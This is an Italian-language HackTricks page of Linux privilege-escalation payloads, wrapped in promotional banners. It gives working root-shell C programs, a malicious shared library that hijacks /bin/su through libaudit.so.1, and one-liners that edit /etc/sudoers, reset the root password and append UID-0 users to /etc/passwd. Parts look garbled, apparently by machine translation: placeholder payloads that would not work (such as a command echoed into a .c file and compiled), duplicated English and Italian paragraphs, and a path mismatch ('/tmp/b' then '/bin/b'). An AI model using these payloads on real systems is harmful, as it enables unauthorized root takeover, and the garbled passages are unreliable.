# Payload da eseguire

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Lavori in una **azienda di sicurezza informatica**? Vuoi vedere la tua **azienda pubblicizzata in HackTricks**? o vuoi avere accesso all'**ultima versione di PEASS o scaricare HackTricks in PDF**? Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* **Unisciti al** [**💬**](https://emojipedia.org/speech-balloon/) [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguimi** su **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR al [repo hacktricks](https://github.com/carlospolop/hacktricks) e al [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Bash
```bash
cp /bin/bash /tmp/b && chmod +s /tmp/b
/bin/b -p #Maintains root privileges from suid, working in debian & buntu
```
## Payload da Eseguire

Una volta ottenuti i privilegi di accesso limitati su un sistema Linux, è possibile utilizzare vari payload per eseguire comandi con privilegi elevati. Di seguito sono elencati alcuni esempi di payload comunemente utilizzati:

### 1. Payload basato su sudo

Se l'utente ha il permesso di eseguire comandi con sudo senza richiedere una password, è possibile utilizzare il seguente payload:

```bash
sudo comando_da_eseguire
```

Sostituire "comando_da_eseguire" con il comando desiderato.

### 2. Payload basato su cron

Se l'utente ha il permesso di eseguire comandi tramite cron, è possibile utilizzare il seguente payload:

```bash
echo "comando_da_eseguire" > /tmp/script.sh
chmod +x /tmp/script.sh
sudo /usr/bin/crontab /tmp/script.sh
```

Sostituire "comando_da_eseguire" con il comando desiderato.

### 3. Payload basato su file SUID

Se si trova un file con il bit SUID impostato, è possibile utilizzare il seguente payload:

```bash
./file_suid
```

Sostituire "file_suid" con il percorso del file SUID desiderato.

### 4. Payload basato su file di configurazione

Se si dispone di accesso in scrittura a un file di configurazione, è possibile utilizzare il seguente payload:

```bash
echo "comando_da_eseguire" >> /path/to/file
```

Sostituire "comando_da_eseguire" con il comando desiderato e "/path/to/file" con il percorso del file di configurazione.

### 5. Payload basato su servizi di sistema

Se si dispone di accesso in scrittura a un file di configurazione di un servizio di sistema, è possibile utilizzare il seguente payload:

```bash
echo "comando_da_eseguire" >> /path/to/service.conf
sudo systemctl restart service
```

Sostituire "comando_da_eseguire" con il comando desiderato, "/path/to/service.conf" con il percorso del file di configurazione del servizio e "service" con il nome del servizio.

### 6. Payload basato su script di inizializzazione

Se si dispone di accesso in scrittura a uno script di inizializzazione, è possibile utilizzare il seguente payload:

```bash
echo "comando_da_eseguire" >> /etc/init.d/script
sudo chmod +x /etc/init.d/script
sudo /etc/init.d/script start
```

Sostituire "comando_da_eseguire" con il comando desiderato e "/etc/init.d/script" con il percorso dello script di inizializzazione.

### 7. Payload basato su variabili d'ambiente

Se si dispone di accesso in scrittura a un file di configurazione che legge variabili d'ambiente, è possibile utilizzare il seguente payload:

```bash
echo "export VAR=comando_da_eseguire" >> /path/to/file
source /path/to/file
```

Sostituire "comando_da_eseguire" con il comando desiderato e "/path/to/file" con il percorso del file di configurazione.

### 8. Payload basato su librerie condivise

Se si dispone di accesso in scrittura a una libreria condivisa, è possibile utilizzare il seguente payload:

```bash
echo "comando_da_eseguire" > /path/to/library.c
gcc -shared -o /path/to/library.so /path/to/library.c
export LD_PRELOAD=/path/to/library.so
```

Sostituire "comando_da_eseguire" con il comando desiderato e "/path/to/library.c" e "/path/to/library.so" con i percorsi desiderati per il file sorgente e la libreria condivisa.

Questi sono solo alcuni esempi di payload che è possibile utilizzare per eseguire comandi con privilegi elevati su un sistema Linux. È importante notare che l'utilizzo di tali payload potrebbe essere considerato un comportamento non autorizzato e potrebbe violare le leggi locali.
```c
//gcc payload.c -o payload
int main(void){
setresuid(0, 0, 0); //Set as user suid user
system("/bin/sh");
return 0;
}
```

```c
//gcc payload.c -o payload
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(){
setuid(getuid());
system("/bin/bash");
return 0;
}
```

```c
// Privesc to user id: 1000
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
char *const paramList[10] = {"/bin/bash", "-p", NULL};
const int id = 1000;
setresuid(id, id, id);
execve(paramList[0], paramList, NULL);
return 0;
}
```
## Sovrascrivere un file per ottenere privilegi elevati

### File comuni

* Aggiungi un utente con password a _/etc/passwd_
* Cambia la password all'interno di _/etc/shadow_
* Aggiungi un utente ai sudoers in _/etc/sudoers_
* Sfrutta Docker attraverso il socket di Docker, di solito in _/run/docker.sock_ o _/var/run/docker.sock_

### Sovrascrivere una libreria

Controlla una libreria utilizzata da un binario, in questo caso `/bin/su`:
```bash
ldd /bin/su
linux-vdso.so.1 (0x00007ffef06e9000)
libpam.so.0 => /lib/x86_64-linux-gnu/libpam.so.0 (0x00007fe473676000)
libpam_misc.so.0 => /lib/x86_64-linux-gnu/libpam_misc.so.0 (0x00007fe473472000)
libaudit.so.1 => /lib/x86_64-linux-gnu/libaudit.so.1 (0x00007fe473249000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe472e58000)
libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe472c54000)
libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
/lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
```
In questo caso proviamo a impersonare `/lib/x86_64-linux-gnu/libaudit.so.1`.\
Quindi, controlla le funzioni di questa libreria utilizzate dal binario **`su`**:
```bash
objdump -T /bin/su | grep audit
0000000000000000      DF *UND*  0000000000000000              audit_open
0000000000000000      DF *UND*  0000000000000000              audit_log_user_message
0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
```
I simboli `audit_open`, `audit_log_acct_message`, `audit_log_acct_message` e `audit_fd` probabilmente provengono dalla libreria libaudit.so.1. Poiché la libreria libaudit.so.1 verrà sovrascritta dalla libreria condivisa dannosa, questi simboli dovrebbero essere presenti nella nuova libreria condivisa, altrimenti il programma non sarà in grado di trovare il simbolo e terminerà.
```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

//gcc -shared -o /lib/x86_64-linux-gnu/libaudit.so.1 -fPIC inject.c

int audit_open;
int audit_log_acct_message;
int audit_log_user_message;
int audit_fd;

void inject()__attribute__((constructor));

void inject()
{
setuid(0);
setgid(0);
system("/bin/bash");
}
```
Ora, semplicemente chiamando **`/bin/su`**, otterrai una shell come root.

## Script

Puoi far eseguire qualcosa come root?

### **www-data in sudoers**
```bash
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```
### **Cambiare la password di root**

To change the root password, you can use the following command:

Per cambiare la password di root, puoi utilizzare il seguente comando:

```bash
sudo passwd root
```

You will be prompted to enter the new password for the root user. After entering the password, it will be changed.

Ti verrà chiesto di inserire la nuova password per l'utente root. Dopo aver inserito la password, questa verrà cambiata.

It is important to choose a strong and secure password to protect the root account from unauthorized access.

È importante scegliere una password forte e sicura per proteggere l'account root da accessi non autorizzati.
```bash
echo "root:hacked" | chpasswd
```
### Aggiungi un nuovo utente root a /etc/passwd

```bash
echo 'newroot:x:0:0:root:/root:/bin/bash' >> /etc/passwd
```

Questo comando aggiunge un nuovo utente chiamato "newroot" con privilegi di root al file /etc/passwd.
```bash
echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
```
<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Lavori in una **azienda di sicurezza informatica**? Vuoi vedere la tua **azienda pubblicizzata in HackTricks**? o vuoi avere accesso all'**ultima versione di PEASS o scaricare HackTricks in PDF**? Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* **Unisciti al** [**💬**](https://emojipedia.org/speech-balloon/) [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguimi** su **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR al [repo hacktricks](https://github.com/carlospolop/hacktricks) e al [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
